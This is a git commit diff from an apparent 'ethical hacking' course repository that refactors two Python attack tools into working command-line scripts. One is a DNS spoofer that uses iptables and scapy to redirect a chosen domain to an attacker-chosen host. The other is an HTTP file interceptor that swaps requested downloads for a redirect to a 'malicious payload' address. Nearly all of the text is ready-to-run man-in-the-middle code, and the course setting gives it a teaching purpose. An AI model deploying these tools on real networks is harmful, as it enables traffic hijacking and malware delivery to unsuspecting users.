d2862a86c50d081faa5fb1b482f1b58aa6b8043e
Robin Goyal <robin.goyal.swd@gmail.com>
2021-02-04 18:46:04 -0500

    Cleaned up code

--- udemy/learn-python-ethical-hacking-from-scratch/dns-spoofer/dns_spoofer.py
+++ udemy/learn-python-ethical-hacking-from-scratch/dns-spoofer/dns_spoofer.py
@@ -1,30 +1,128 @@
 #!/usr/bin/env python3
 
+import argparse
+import subprocess
+
 import netfilterqueue
 import kamene.all as scapy
 
 
-def process_packet(packet):
-    scapy_packet = scapy.IP(packet.get_payload())
+def get_arguments():
+    """
+    Return the arguments:
+    - traffic: Spoof traffic on the [local] machine or [remote] machine
+    - domain: Which domain to spoof traffic for
+    - queue: The queue number to capture packets for
+    """
 
-    if scapy_packet.haslayer(scapy.DNSRR):
-        qname = scapy_packet[scapy.DNSQR].qname
-        if b"www.bing.com" in qname:
-            print("[+] Spoofing target")
-            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.4")
-            scapy_packet[scapy.DNS].an = answer
-            scapy_packet[scapy.DNS].ancount = 1
+    # Create parser
+    parser = argparse.ArgumentParser()
+    parser.add_argument("traffic", choices=["local", "remote"], help="Capture traffic on local or remote machine")
+    parser.add_argument("domain", help="Provide a domain to spoof and respond with")
+    parser.add_argument("host", help="Host address to redirect user to")
+    parser.add_argument("-q", "--queue-num", dest="queue", default=0, type=int,
+                        help="Provide the queue number to capture packets for")
 
-            del scapy_packet[scapy.IP].len
-            del scapy_packet[scapy.IP].chksum
-            del scapy_packet[scapy.UDP].len
-            del scapy_packet[scapy.UDP].chksum
-
-            packet.set_payload(bytes(scapy_packet))
-
-    packet.accept()
+    # Parse args
+    arguments = parser.parse_args()
+    return arguments
 
 
-queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, process_packet)
-queue.run()
+def queue_local_traffic(queue_number):
+    """Capture local traffic to the queue"""
+    subprocess.run(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", str(queue_number)], check=True)
+    subprocess.run(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", str(queue_number)], check=True)
+
+
+def queue_remote_traffic(queue_number):
+    """Capture remote traffic to the queue"""
+    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", str(queue_number)], check=True)
+
+
+def reset_ip_tables():
+    """Reset IP tables"""
+    subprocess.run(["iptables", "--flush"], check=True)
+
+
+class DNSSpoofer:
+    """
+    DNS Spoofer
+
+    This class accepts the domain to spoof the DNS address for as well
+    as the host to redirect the victim to.
+
+    The process_packet method is the callback function to the NFQ.
+    """
+
+    def __init__(self, domain, host):
+        self.domain = domain
+        self.host = host
+
+    def process_packet(self, packet):
+        # Convert scapy_packet
+        scapy_packet = scapy.IP(packet.get_payload())
+
+        # Check if the packet has a DNS Response layer
+        if scapy_packet.haslayer(scapy.DNSRR):
+
+            # Capture the DNS request qname
+            qname = scapy_packet[scapy.DNSQR].qname
+            if self.domain.encode() in qname:
+                print(f"[+] Captured Traffic! Spoofing {scapy_packet[scapy.IP].src} to {self.host}.")
+
+                # Remove all other answers and save the spoofed answer
+                answer = scapy.DNSRR(rrname=qname, rdata=self.host)
+                scapy_packet[scapy.DNS].an = answer
+                scapy_packet[scapy.DNS].ancount = 1
+
+                # Delete IP/UDP fields so they can be recalculated by scapy
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.UDP].len
+                del scapy_packet[scapy.UDP].chksum
+
+                # Set the new payload
+                packet.set_payload(bytes(scapy_packet))
+
+        # Forward off the packet through the queue
+        packet.accept()
+
+
+def main(args):
+    traffic = args.traffic
+    domain = args.domain
+    host = args.host
+    queue_number = args.queue
+
+    queue = None
+    try:
+        if traffic == "local":
+            queue_local_traffic(queue_number)
+            print(f"[+] Capturing local traffic in Queue {queue_number}.")
+        elif traffic == "remote":
+            queue_remote_traffic(queue_number)
+            print(f"[+] Capturing remote traffic in Queue {queue_number}.")
+
+        # Initialize DNS Spoofer instance with variable content
+        dns_spoofer = DNSSpoofer(domain, host)
+
+        # Bind queue
+        queue = netfilterqueue.NetfilterQueue()
+        queue.bind(queue_number, dns_spoofer.process_packet)
+
+        print(f"[+] Successfully binded to Queue {queue_number}")
+        queue.run()
+
+    except KeyboardInterrupt:
+        print("\n[-] Detected CTRL + C ..... Resetting IP tables ..... Please wait..")
+    except Exception as e:
+        print(f"[-] Exception caught: {str(e)} ..... Resetting IP tables ..... Please wait..")
+    finally:
+        if queue:
+            queue.unbind()
+        reset_ip_tables()
+
+
+if __name__ == "__main__":
+    args = get_arguments()
+    main(args)
--- udemy/learn-python-ethical-hacking-from-scratch/file-interceptor/file-interceptor.py
+++ udemy/learn-python-ethical-hacking-from-scratch/file-interceptor/file-interceptor.py
@@ -1,41 +1,149 @@
 #!/usr/bin/env python3
 
+import argparse
+import subprocess
+import socket
+from urllib.parse import urlparse
+
 import netfilterqueue
 import kamene.all as scapy
 
 
-ack_list = []
+def get_arguments():
+    """
+    Return the arguments:
+    - traffic: Spoof traffic on the [local] machine or [remote] machine
+    - domain: Which domain to spoof traffic for
+    - queue: The queue number to capture packets for
+    """
+
+    # Create parser
+    parser = argparse.ArgumentParser()
+    parser.add_argument("traffic", choices=["local", "remote"], help="Capture traffic on local or remote machine")
+    parser.add_argument("extension", help="Provide a file extension to intercept traffic for")
+    parser.add_argument("redirect", help="Address to redirect user to")
+    parser.add_argument("-q", "--queue-num", dest="queue", default=0, type=int,
+                        help="Provide the queue number to capture packets for")
+
+    # Parse args
+    arguments = parser.parse_args()
+    return arguments
 
 
-def set_packet_load(packet, load):
-    packet[scapy.Raw].load = load
-
-    del packet[scapy.IP].len
-    del packet[scapy.IP].chksum
-    del packet[scapy.TCP].chksum
-
-    return packet
+def queue_local_traffic(queue_number):
+    """Capture local traffic to the queue"""
+    subprocess.run(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", str(queue_number)], check=True)
+    subprocess.run(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", str(queue_number)], check=True)
 
 
-def process_packet(packet):
-    scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.Raw):
-        if scapy_packet[scapy.TCP].dport == 80:
-            load = scapy_packet[scapy.Raw].load.decode()
-            if ".pdf" in load.lower():
-                print("[+] exe Request")
-                ack_list.append(scapy_packet[scapy.TCP].ack)
-        elif scapy_packet[scapy.TCP].sport == 80:
-            if scapy_packet[scapy.TCP].seq in ack_list:
-                # Remove ack from list
-                ack_list.remove(scapy_packet[scapy.TCP].seq)
-                print("[+] Replacing file")
-
-                modified_packet = set_packet_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://google.com\n\n")
-                packet.set_payload(bytes(modified_packet))
-    packet.accept()
+def queue_remote_traffic(queue_number):
+    """Capture remote traffic to the queue"""
+    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", str(queue_number)], check=True)
 
 
-queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, process_packet)
-queue.run()
+def reset_ip_tables():
+    """Reset IP tables"""
+    subprocess.run(["iptables", "--flush"], check=True)
+
+
+class FileInterceptor:
+    """
+    FileInterceptor
+
+    This class accepts the extension to monitor for and redirect
+    the user to the address with the malicious payload that
+    replaces the originally requested payload
+
+    The process_packet method is the callback function to the NFQ.
+    """
+
+    def __init__(self, extension, redirect_address):
+        self.ack_list = []
+        self.extension = extension
+        self.redirect_address = redirect_address  # Location of the malicious payload to redirect user to
+
+        # Potentially strip off the port if its in the netloc
+        domain = urlparse(self.redirect_address).netloc.split(":")[0]
+        self.redirect_ip_address = socket.gethostbyname(domain)
+
+    @classmethod
+    def set_packet_load(cls, packet, load):
+        packet[scapy.Raw].load = load
+
+        del packet[scapy.IP].len
+        del packet[scapy.IP].chksum
+        del packet[scapy.TCP].chksum
+
+        return packet
+
+    def process_packet(self, packet):
+        scapy_packet = scapy.IP(packet.get_payload())
+
+        # Check if the packet has an HTTP Raw layer
+        if scapy_packet.haslayer(scapy.Raw):
+
+            # Check if the packet is an HTTP request AND
+            #    the packet is not destined for the malicious payload address
+            # This prevents an infinite redirection situation
+            if scapy_packet[scapy.TCP].dport == 80 and scapy_packet[scapy.IP].dst != self.redirect_ip_address:
+                # Safely decode the packet if its part of HTTP traffic
+                load = scapy_packet[scapy.Raw].load.decode()
+
+                # Save the ack in case of multiple requests for a file with extension
+                if self.extension in load.lower():
+                    print(f"[+] Request for {self.extension} file")
+                    self.ack_list.append(scapy_packet[scapy.TCP].ack)
+
+            # Check if the packet is an HTTP response
+            elif scapy_packet[scapy.TCP].sport == 80:
+                if scapy_packet[scapy.TCP].seq in self.ack_list:
+                    # Remove ack from list
+                    self.ack_list.remove(scapy_packet[scapy.TCP].seq)
+                    print("[+] Replacing file")
+
+                    # Update the load to redirect the user to the new load
+                    redirection_load = f"HTTP/1.1 301 Moved Permanently\nLocation: {self.redirect_address}\n\n"
+                    modified_packet = self.set_packet_load(scapy_packet, redirection_load)
+                    packet.set_payload(bytes(modified_packet))
+
+        packet.accept()
+
+
+def main(args):
+    traffic = args.traffic
+    extension = args.extension
+    redirect = args.redirect
+    queue_number = args.queue
+
+    queue = None
+    try:
+        if traffic == "local":
+            queue_local_traffic(queue_number)
+            print(f"[+] Capturing local traffic in Queue {queue_number}.")
+        elif traffic == "remote":
+            queue_remote_traffic(queue_number)
+            print(f"[+] Capturing remote traffic in Queue {queue_number}.")
+
+        # Initialize DNS Spoofer instance with variable content
+        file_interceptor = FileInterceptor(extension, redirect)
+
+        # Bind queue
+        queue = netfilterqueue.NetfilterQueue()
+        queue.bind(queue_number, file_interceptor.process_packet)
+
+        print(f"[+] Successfully binded to Queue {queue_number}")
+        queue.run()
+
+    except KeyboardInterrupt:
+        print("\n[-] Detected CTRL + C ..... Resetting IP tables ..... Please wait..")
+    except Exception as e:
+        print(f"[-] Exception caught: {str(e)} ..... Resetting IP tables ..... Please wait..")
+    finally:
+        if queue:
+            queue.unbind()
+        reset_ip_tables()
+
+
+if __name__ == "__main__":
+    args = get_arguments()
+    main(args)
